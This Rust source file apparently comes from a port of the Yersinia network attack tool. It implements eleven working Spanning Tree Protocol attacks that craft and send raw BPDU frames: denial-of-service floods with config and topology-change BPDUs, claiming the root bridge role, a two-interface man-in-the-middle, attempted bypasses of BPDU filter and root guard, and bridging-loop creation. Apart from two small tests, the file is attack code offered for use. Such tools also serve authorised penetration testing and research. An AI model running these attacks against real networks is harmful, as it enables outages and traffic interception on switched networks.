//! STP Attack implementations
//!
//! This module implements all STP attacks with full compatibility with the original Yersinia.

use async_trait::async_trait;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::time;
use yersinia_core::{
    protocol::AttackParams, Attack, AttackContext, AttackStats, Error, Interface, MacAddr, Result,
};

use super::constants::*;
use super::packet::{BridgeId, ConfigBpdu, RstpFlags, TcnBpdu};

/// Helper to build complete Ethernet + LLC + BPDU frame
fn build_stp_frame(src_mac: MacAddr, bpdu_data: &[u8]) -> Vec<u8> {
    let mut frame = Vec::new();

    // Ethernet header (14 bytes)
    // Destination MAC (STP multicast)
    frame.extend_from_slice(&STP_MULTICAST_MAC.0);
    // Source MAC
    frame.extend_from_slice(&src_mac.0);
    // Length (802.3 style)
    let llc_bpdu_len = 3 + bpdu_data.len(); // LLC (3) + BPDU
    frame.extend_from_slice(&(llc_bpdu_len as u16).to_be_bytes());

    // LLC header (3 bytes)
    frame.push(STP_LLC_DSAP);
    frame.push(STP_LLC_SSAP);
    frame.push(STP_LLC_CONTROL);

    // BPDU data
    frame.extend_from_slice(bpdu_data);

    frame
}

/// Helper to send complete STP frame to interface
async fn send_frame(interface: &Interface, frame: &[u8]) -> Result<()> {
    // Frame is already complete (Ethernet + LLC + BPDU) from build_stp_frame
    interface.send_raw(frame)
}

// =============================================================================
// Attack 1: Send Config BPDU (Single shot)
// =============================================================================

pub struct StpSendConfAttack {
    interface: Interface,
    bpdu: ConfigBpdu,
    running: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl StpSendConfAttack {
    pub fn new(params: AttackParams, interface: &Interface) -> Result<Self> {
        let bridge_mac = params
            .get("bridge_mac")
            .and_then(|v| match v {
                yersinia_core::protocol::ParamValue::MacAddr(mac) => Some(*mac),
                _ => None,
            })
            .ok_or_else(|| Error::invalid_parameter("bridge_mac", "required parameter"))?;

        let priority = params.get_u32("priority").unwrap_or(32768) as u16;
        let is_root = params.get_bool("root").unwrap_or(false);

        let bridge_id = BridgeId::new(priority, bridge_mac);
        let root_id = if is_root {
            BridgeId::lowest_priority(bridge_mac)
        } else {
            bridge_id
        };

        let bpdu = ConfigBpdu::new(bridge_id, root_id);

        Ok(Self {
            interface: interface.clone(),
            bpdu,
            running: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        })
    }
}

#[async_trait]
impl Attack for StpSendConfAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        let bpdu_data = self.bpdu.build();
        let frame = build_stp_frame(self.bpdu.bridge_id.mac, &bpdu_data);

        send_frame(&self.interface, &frame).await?;
        self.packets_sent.fetch_add(1, Ordering::SeqCst);

        self.running.store(false, Ordering::SeqCst);
        Ok(())
    }

    fn pause(&self) {
        // Single-shot attack, no pause needed
    }

    fn resume(&self) {
        // Single-shot attack, no resume needed
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "Send Config BPDU"
    }
}

// =============================================================================
// Attack 2: Send TCN BPDU (Single shot)
// =============================================================================

pub struct StpSendTcnAttack {
    interface: Interface,
    source_mac: MacAddr,
    running: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl StpSendTcnAttack {
    pub fn new(params: AttackParams, interface: &Interface) -> Result<Self> {
        let source_mac = params
            .get("source_mac")
            .and_then(|v| match v {
                yersinia_core::protocol::ParamValue::MacAddr(mac) => Some(*mac),
                _ => None,
            })
            .ok_or_else(|| Error::invalid_parameter("source_mac", "required parameter"))?;

        Ok(Self {
            interface: interface.clone(),
            source_mac,
            running: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        })
    }
}

#[async_trait]
impl Attack for StpSendTcnAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        let bpdu = TcnBpdu::new();
        let bpdu_data = bpdu.build();
        let frame = build_stp_frame(self.source_mac, &bpdu_data);

        send_frame(&self.interface, &frame).await?;
        self.packets_sent.fetch_add(1, Ordering::SeqCst);

        self.running.store(false, Ordering::SeqCst);
        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "Send TCN BPDU"
    }
}

// =============================================================================
// Attack 3: DoS with Config BPDUs (Continuous)
// =============================================================================

pub struct StpDosConfAttack {
    interface: Interface,
    rate_pps: u32,
    randomize: bool,
    running: Arc<AtomicBool>,
    paused: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl StpDosConfAttack {
    pub fn new(params: AttackParams, interface: &Interface) -> Result<Self> {
        let rate_pps = params.get_u32("rate_pps").unwrap_or(10);
        let randomize = params.get_bool("randomize").unwrap_or(true);

        Ok(Self {
            interface: interface.clone(),
            rate_pps,
            randomize,
            running: Arc::new(AtomicBool::new(false)),
            paused: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        })
    }

    fn generate_random_mac() -> MacAddr {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let mut mac = [0u8; 6];
        rng.fill(&mut mac);
        // Clear multicast bit
        mac[0] &= 0xFE;
        MacAddr(mac)
    }

    fn generate_random_priority() -> u16 {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        rng.gen::<u16>()
    }
}

#[async_trait]
impl Attack for StpDosConfAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        let interval = Duration::from_millis(1000 / self.rate_pps as u64);

        while self.running.load(Ordering::SeqCst) {
            if !self.paused.load(Ordering::SeqCst) {
                let (bridge_mac, priority) = if self.randomize {
                    (
                        Self::generate_random_mac(),
                        Self::generate_random_priority(),
                    )
                } else {
                    (self.interface.mac_address, 32768)
                };

                let bridge_id = BridgeId::new(priority, bridge_mac);
                let root_id = BridgeId::lowest_priority(bridge_mac);

                let mut bpdu = ConfigBpdu::new(bridge_id, root_id);
                // Set topology change flag to force reconvergence
                bpdu.flags = 0x01;

                let bpdu_data = bpdu.build();
                let frame = build_stp_frame(bridge_mac, &bpdu_data);

                if let Err(e) = send_frame(&self.interface, &frame).await {
                    eprintln!("Failed to send frame: {}", e);
                } else {
                    self.packets_sent.fetch_add(1, Ordering::SeqCst);
                }
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::SeqCst);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::SeqCst);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "DoS with Config BPDUs"
    }
}

// =============================================================================
// Attack 4: DoS with TCN BPDUs (Continuous)
// =============================================================================

pub struct StpDosTcnAttack {
    interface: Interface,
    rate_pps: u32,
    running: Arc<AtomicBool>,
    paused: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl StpDosTcnAttack {
    pub fn new(params: AttackParams, interface: &Interface) -> Result<Self> {
        let rate_pps = params.get_u32("rate_pps").unwrap_or(10);

        Ok(Self {
            interface: interface.clone(),
            rate_pps,
            running: Arc::new(AtomicBool::new(false)),
            paused: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        })
    }

    fn generate_random_mac() -> MacAddr {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let mut mac = [0u8; 6];
        rng.fill(&mut mac);
        mac[0] &= 0xFE;
        MacAddr(mac)
    }
}

#[async_trait]
impl Attack for StpDosTcnAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        let interval = Duration::from_millis(1000 / self.rate_pps as u64);
        let bpdu = TcnBpdu::new();
        let bpdu_data = bpdu.build();

        while self.running.load(Ordering::SeqCst) {
            if !self.paused.load(Ordering::SeqCst) {
                let source_mac = Self::generate_random_mac();
                let frame = build_stp_frame(source_mac, &bpdu_data);

                if let Err(e) = send_frame(&self.interface, &frame).await {
                    eprintln!("Failed to send frame: {}", e);
                } else {
                    self.packets_sent.fetch_add(1, Ordering::SeqCst);
                }
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::SeqCst);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::SeqCst);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "DoS with TCN BPDUs"
    }
}

// =============================================================================
// Attack 5: Claim Root Role (Continuous)
// =============================================================================

pub struct StpClaimRootAttack {
    interface: Interface,
    bridge_mac: MacAddr,
    hello_time: u16,
    version: u8,
    running: Arc<AtomicBool>,
    paused: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl StpClaimRootAttack {
    pub fn new(params: AttackParams, interface: &Interface) -> Result<Self> {
        let bridge_mac = params
            .get("bridge_mac")
            .and_then(|v| match v {
                yersinia_core::protocol::ParamValue::MacAddr(mac) => Some(*mac),
                _ => None,
            })
            .ok_or_else(|| Error::invalid_parameter("bridge_mac", "required parameter"))?;

        let hello_time_secs = params.get_u32("hello_time").unwrap_or(2);
        let hello_time = (hello_time_secs as u16) * 256; // Convert to 1/256 seconds

        let version_str = params.get_string("version").unwrap_or("stp");
        let version = match version_str {
            "stp" => STP_VERSION_STP,
            "rstp" => STP_VERSION_RSTP,
            "mstp" => STP_VERSION_MSTP,
            _ => STP_VERSION_STP,
        };

        Ok(Self {
            interface: interface.clone(),
            bridge_mac,
            hello_time,
            version,
            running: Arc::new(AtomicBool::new(false)),
            paused: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        })
    }
}

#[async_trait]
impl Attack for StpClaimRootAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        // Calculate interval from hello_time (in 1/256 seconds)
        let interval = Duration::from_millis((self.hello_time as u64 * 1000) / 256);

        while self.running.load(Ordering::SeqCst) {
            if !self.paused.load(Ordering::SeqCst) {
                // Claim root with priority 0
                let bridge_id = BridgeId::lowest_priority(self.bridge_mac);

                let mut bpdu = ConfigBpdu::new(bridge_id, bridge_id);
                bpdu.hello_time = self.hello_time;
                bpdu.version = self.version;

                // For RSTP, set appropriate flags
                if self.version == STP_VERSION_RSTP {
                    bpdu = bpdu.as_rstp().with_rstp_flags(RstpFlags::root_bridge());
                } else if self.version == STP_VERSION_MSTP {
                    bpdu = bpdu.as_mstp().with_rstp_flags(RstpFlags::root_bridge());
                }

                let bpdu_data = bpdu.build();
                let frame = build_stp_frame(self.bridge_mac, &bpdu_data);

                if let Err(e) = send_frame(&self.interface, &frame).await {
                    eprintln!("Failed to send frame: {}", e);
                } else {
                    self.packets_sent.fetch_add(1, Ordering::SeqCst);
                }
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::SeqCst);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::SeqCst);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "Claim Root Role"
    }
}

// =============================================================================
// Attack 6: Claim Other Role (Continuous)
// =============================================================================

pub struct StpClaimOtherAttack {
    interface: Interface,
    bridge_mac: MacAddr,
    bridge_priority: u16,
    root_mac: MacAddr,
    root_priority: u16,
    running: Arc<AtomicBool>,
    paused: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl StpClaimOtherAttack {
    pub fn new(params: AttackParams, interface: &Interface) -> Result<Self> {
        let bridge_mac = params
            .get("bridge_mac")
            .and_then(|v| match v {
                yersinia_core::protocol::ParamValue::MacAddr(mac) => Some(*mac),
                _ => None,
            })
            .ok_or_else(|| Error::invalid_parameter("bridge_mac", "required parameter"))?;

        let root_mac = params
            .get("root_mac")
            .and_then(|v| match v {
                yersinia_core::protocol::ParamValue::MacAddr(mac) => Some(*mac),
                _ => None,
            })
            .ok_or_else(|| Error::invalid_parameter("root_mac", "required parameter"))?;

        let bridge_priority = params.get_u32("priority").unwrap_or(32768) as u16;
        let root_priority = params.get_u32("root_priority").unwrap_or(32768) as u16;

        Ok(Self {
            interface: interface.clone(),
            bridge_mac,
            bridge_priority,
            root_mac,
            root_priority,
            running: Arc::new(AtomicBool::new(false)),
            paused: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        })
    }
}

#[async_trait]
impl Attack for StpClaimOtherAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        let interval = Duration::from_millis(DEFAULT_ATTACK_INTERVAL_MS);

        while self.running.load(Ordering::SeqCst) {
            if !self.paused.load(Ordering::SeqCst) {
                let bridge_id = BridgeId::new(self.bridge_priority, self.bridge_mac);
                let root_id = BridgeId::new(self.root_priority, self.root_mac);

                let bpdu = ConfigBpdu::new(bridge_id, root_id);
                let bpdu_data = bpdu.build();
                let frame = build_stp_frame(self.bridge_mac, &bpdu_data);

                if let Err(e) = send_frame(&self.interface, &frame).await {
                    eprintln!("Failed to send frame: {}", e);
                } else {
                    self.packets_sent.fetch_add(1, Ordering::SeqCst);
                }
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::SeqCst);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::SeqCst);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "Claim Other Role"
    }
}

// =============================================================================
// Attack 7: Root Role MITM (Continuous, Multi-interface)
// =============================================================================

pub struct StpMitmAttack {
    interface1: Interface,
    interface2: Interface,
    bridge_mac: MacAddr,
    running: Arc<AtomicBool>,
    paused: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl StpMitmAttack {
    pub fn new(params: AttackParams, _interface: &Interface) -> Result<Self> {
        let bridge_mac = params
            .get("bridge_mac")
            .and_then(|v| match v {
                yersinia_core::protocol::ParamValue::MacAddr(mac) => Some(*mac),
                _ => None,
            })
            .ok_or_else(|| Error::invalid_parameter("bridge_mac", "required parameter"))?;

        let iface1_name = params
            .get_string("interface1")
            .ok_or_else(|| Error::invalid_parameter("interface1", "required parameter"))?;

        let iface2_name = params
            .get_string("interface2")
            .ok_or_else(|| Error::invalid_parameter("interface2", "required parameter"))?;

        // Create Interface objects from names
        let interface1 = Interface::by_name(iface1_name)
            .map_err(|_| Error::invalid_parameter("interface1", "interface not found"))?;
        let interface2 = Interface::by_name(iface2_name)
            .map_err(|_| Error::invalid_parameter("interface2", "interface not found"))?;

        Ok(Self {
            interface1,
            interface2,
            bridge_mac,
            running: Arc::new(AtomicBool::new(false)),
            paused: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        })
    }
}

#[async_trait]
impl Attack for StpMitmAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        let interval = Duration::from_millis(DEFAULT_ATTACK_INTERVAL_MS);

        // Claim root with priority 0
        let bridge_id = BridgeId::lowest_priority(self.bridge_mac);
        let bpdu = ConfigBpdu::new(bridge_id, bridge_id)
            .as_rstp()
            .with_rstp_flags(RstpFlags::root_bridge());

        let bpdu_data = bpdu.build();

        while self.running.load(Ordering::SeqCst) {
            if !self.paused.load(Ordering::SeqCst) {
                // Send on both interfaces to position ourselves as MITM
                let frame = build_stp_frame(self.bridge_mac, &bpdu_data);

                // Send on interface 1
                if let Err(e) = send_frame(&self.interface1, &frame).await {
                    eprintln!("Failed to send on interface1: {}", e);
                } else {
                    self.packets_sent.fetch_add(1, Ordering::SeqCst);
                }

                // Send on interface 2
                if let Err(e) = send_frame(&self.interface2, &frame).await {
                    eprintln!("Failed to send on interface2: {}", e);
                } else {
                    self.packets_sent.fetch_add(1, Ordering::SeqCst);
                }
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::SeqCst);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::SeqCst);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "Root Role MITM"
    }
}

// =============================================================================
// Attack 8: TCN Flooding - Flood with Topology Change Notifications
// =============================================================================

pub struct StpTcnFloodingAttack {
    interface: Interface,
    bridge_mac: MacAddr,
    running: Arc<AtomicBool>,
    paused: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
    rate_pps: u32,
}

impl StpTcnFloodingAttack {
    pub fn new(params: AttackParams, interface: &Interface) -> Result<Self> {
        let bridge_mac = params
            .get("bridge_mac")
            .and_then(|v| match v {
                yersinia_core::protocol::ParamValue::MacAddr(mac) => Some(*mac),
                _ => None,
            })
            .unwrap_or(MacAddr([0x00, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE]));

        let rate_pps = params.get_u32("rate").unwrap_or(100);

        Ok(Self {
            interface: interface.clone(),
            bridge_mac,
            running: Arc::new(AtomicBool::new(false)),
            paused: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
            rate_pps,
        })
    }
}

#[async_trait]
impl Attack for StpTcnFloodingAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        let tcn = TcnBpdu::new();
        let interval = Duration::from_micros(1_000_000 / self.rate_pps as u64);

        while self.running.load(Ordering::SeqCst) {
            let bpdu_data = tcn.build();
            let frame = build_stp_frame(self.bridge_mac, &bpdu_data);

            send_frame(&self.interface, &frame).await?;
            self.packets_sent.fetch_add(1, Ordering::SeqCst);

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::SeqCst);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::SeqCst);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "TCN Flooding"
    }
}

// =============================================================================
// Attack 9: BPDU Filter Bypass - Send BPDUs to bypass BPDU filter
// =============================================================================

pub struct StpBpduFilterBypassAttack {
    interface: Interface,
    bridge_mac: MacAddr,
    running: Arc<AtomicBool>,
    paused: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl StpBpduFilterBypassAttack {
    pub fn new(params: AttackParams, interface: &Interface) -> Result<Self> {
        let bridge_mac = params
            .get("bridge_mac")
            .and_then(|v| match v {
                yersinia_core::protocol::ParamValue::MacAddr(mac) => Some(*mac),
                _ => None,
            })
            .unwrap_or(MacAddr([0x00, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE]));

        Ok(Self {
            interface: interface.clone(),
            bridge_mac,
            running: Arc::new(AtomicBool::new(false)),
            paused: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        })
    }
}

#[async_trait]
impl Attack for StpBpduFilterBypassAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        // Send BPDUs with different characteristics to bypass filters
        let bridge_id = BridgeId::new(4096, self.bridge_mac); // Superior priority
        let root_id = BridgeId::lowest_priority(self.bridge_mac);

        while self.running.load(Ordering::SeqCst) {
            // Try different BPDU types
            let mut bpdu = ConfigBpdu::new(bridge_id, root_id);
            bpdu.hello_time = 1; // Short hello time

            let bpdu_data = bpdu.build();
            let frame = build_stp_frame(self.bridge_mac, &bpdu_data);

            send_frame(&self.interface, &frame).await?;
            self.packets_sent.fetch_add(1, Ordering::SeqCst);

            time::sleep(Duration::from_secs(2)).await;
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::SeqCst);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::SeqCst);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "BPDU Filter Bypass"
    }
}

// =============================================================================
// Attack 10: Root Guard Bypass - Bypass Root Guard protection
// =============================================================================

pub struct StpRootGuardBypassAttack {
    interface: Interface,
    bridge_mac: MacAddr,
    running: Arc<AtomicBool>,
    paused: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl StpRootGuardBypassAttack {
    pub fn new(params: AttackParams, interface: &Interface) -> Result<Self> {
        let bridge_mac = params
            .get("bridge_mac")
            .and_then(|v| match v {
                yersinia_core::protocol::ParamValue::MacAddr(mac) => Some(*mac),
                _ => None,
            })
            .unwrap_or(MacAddr([0x00, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE]));

        Ok(Self {
            interface: interface.clone(),
            bridge_mac,
            running: Arc::new(AtomicBool::new(false)),
            paused: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        })
    }
}

#[async_trait]
impl Attack for StpRootGuardBypassAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        // Claim to be root with extremely low priority
        let bridge_id = BridgeId::new(0, self.bridge_mac); // Lowest possible priority
        let root_id = bridge_id;

        while self.running.load(Ordering::SeqCst) {
            let bpdu = ConfigBpdu::new(bridge_id, root_id);
            let bpdu_data = bpdu.build();
            let frame = build_stp_frame(self.bridge_mac, &bpdu_data);

            send_frame(&self.interface, &frame).await?;
            self.packets_sent.fetch_add(1, Ordering::SeqCst);

            time::sleep(Duration::from_secs(2)).await;
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::SeqCst);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::SeqCst);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "Root Guard Bypass"
    }
}

// =============================================================================
// Attack 11: Loop Creation - Create bridging loops
// =============================================================================

pub struct StpLoopCreationAttack {
    interface: Interface,
    bridge_mac: MacAddr,
    running: Arc<AtomicBool>,
    paused: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl StpLoopCreationAttack {
    pub fn new(params: AttackParams, interface: &Interface) -> Result<Self> {
        let bridge_mac = params
            .get("bridge_mac")
            .and_then(|v| match v {
                yersinia_core::protocol::ParamValue::MacAddr(mac) => Some(*mac),
                _ => None,
            })
            .unwrap_or(MacAddr([0x00, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE]));

        Ok(Self {
            interface: interface.clone(),
            bridge_mac,
            running: Arc::new(AtomicBool::new(false)),
            paused: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        })
    }
}

#[async_trait]
impl Attack for StpLoopCreationAttack {
    async fn execute(&self, _ctx: AttackContext) -> Result<()> {
        self.running.store(true, Ordering::SeqCst);

        // Send conflicting BPDUs to create loops
        let bridge_id = BridgeId::new(32768, self.bridge_mac);

        while self.running.load(Ordering::SeqCst) {
            // Send BPDU claiming all ports should forward
            let mut bpdu = ConfigBpdu::new(bridge_id, bridge_id);
            bpdu.port_id = 0x8001; // Designated port

            let bpdu_data = bpdu.build();
            let frame = build_stp_frame(self.bridge_mac, &bpdu_data);

            send_frame(&self.interface, &frame).await?;
            self.packets_sent.fetch_add(1, Ordering::SeqCst);

            // Also send with different port ID to confuse topology
            let mut bpdu2 = ConfigBpdu::new(bridge_id, bridge_id);
            bpdu2.port_id = 0x8002;

            let bpdu_data2 = bpdu2.build();
            let frame2 = build_stp_frame(self.bridge_mac, &bpdu_data2);

            send_frame(&self.interface, &frame2).await?;
            self.packets_sent.fetch_add(1, Ordering::SeqCst);

            time::sleep(Duration::from_secs(1)).await;
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::SeqCst);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::SeqCst);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::SeqCst),
            ..Default::default()
        }
    }

    fn name(&self) -> &str {
        "Loop Creation"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_stp_frame() {
        let src_mac = MacAddr([0x00, 0x11, 0x22, 0x33, 0x44, 0x55]);
        let bpdu_data = vec![0x00, 0x00, 0x00, 0x00]; // Minimal BPDU

        let frame = build_stp_frame(src_mac, &bpdu_data);

        // Check Ethernet destination (STP multicast)
        assert_eq!(&frame[0..6], &STP_MULTICAST_MAC.0);
        // Check source MAC
        assert_eq!(&frame[6..12], &src_mac.0);
        // Check LLC DSAP/SSAP
        assert_eq!(frame[14], STP_LLC_DSAP);
        assert_eq!(frame[15], STP_LLC_SSAP);
    }

    #[test]
    fn test_claim_root_attack_params() {
        let interface = Interface::new("eth0".to_string(), 0, MacAddr::zero());
        let mac = MacAddr([0x00, 0x11, 0x22, 0x33, 0x44, 0x55]);

        let params = yersinia_core::protocol::AttackParams::new()
            .set(
                "bridge_mac",
                yersinia_core::protocol::ParamValue::MacAddr(mac),
            )
            .set("hello_time", yersinia_core::protocol::ParamValue::U32(2))
            .set(
                "version",
                yersinia_core::protocol::ParamValue::String("rstp".to_string()),
            );

        let attack = StpClaimRootAttack::new(params, &interface);
        assert!(attack.is_ok());
    }
}
